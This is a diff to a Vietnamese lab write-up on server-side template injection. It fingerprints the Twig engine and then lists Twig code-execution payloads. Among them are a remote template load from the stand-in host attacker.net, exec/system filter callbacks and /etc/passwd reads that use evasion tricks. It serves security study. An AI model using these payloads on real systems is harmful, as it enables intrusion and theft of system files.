@@ -46,8 +46,27 @@ Hello user01
 - Sau khi phát hiện tiêm mẫu, bước tiếp theo là xác định template engine đang được sử dụng. Bước này đôi khi cũng đơn giản như việc gửi cú pháp không hợp lệ, vì các công cụ mẫu có thể tự nhận dạng trong các thông báo lỗi kết quả. Tôi sẽ làm theo sơ đồ ở dưới.
 ![Hình 1.](~/../img/1.png)
 
-- Mũi tên màu xanh lá cây và màu đỏ lần lượt thể hiện các câu trả lời "thành công" và "thất bại". Trong một số trường hợp, một trọng tải duy nhất có thể có nhiều phản hồi thành công khác nhau - ví dụ: thăm dò {{7 * '7'}} sẽ cho kết quả là 49 ở Twig, 7777777 ở Jinja2 và cũng không nếu không có ngôn ngữ mẫu nào được sử dụng.
+- Mũi tên màu xanh lá cây và màu đỏ lần lượt thể hiện các câu trả lời "thành công" và "thất bại". Trong một số trường hợp, một trọng tải duy nhất có thể có nhiều phản hồi thành công khác nhau - ví dụ: thăm dò `{{7 * '7'}}` sẽ cho kết quả là 49 ở Twig, `'7777777'` ở Jinja2 và cũng không nếu không có ngôn ngữ mẫu nào được sử dụng.
 ![Hình 2.](~/../img/2.png)
+
+- Có thể thấy hình trên thì trường hợp `{{7*7}}` kết quả vẫn là `Hello 49` thì ta có thể suy ra có 2 template engine có thể đc sử dụng trong này là `Jinja2` của Python và `Twig` của PHP. Theo sơ đồ thì nó sẽ đi theo nhánh phía dưới. Tiếp tục thử `{{7*'7'}}`, nếu kết quả là `Hello 49` thì là template engine `Twig`, còn `Hello '7777777'` thì là `Jinja2`.
+![Hình 3.](~/../img/3.png)
+
+- Có thể thấy kết quả ở trên thì ta sử dụng template engine là `Twig`.
+- Tôi lên trang `Hacktricks` để có thể tìm các exec code để có thể test. Phía dưới là các exec code để test:
+```php
+#Exec code
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+```
+
+- Tôi sử dụng đoạn `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` để xem thử id của user nhưng không thành công. Nhưng nếu tôi đổi `id` thành `whoami` thì có kết quả.
+- Tôi tiếp tục sử dụng đoạn `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}` để test và kết quả ở phía dưới.
+![Hình 4.](~/../img/4.png)
 
 
 
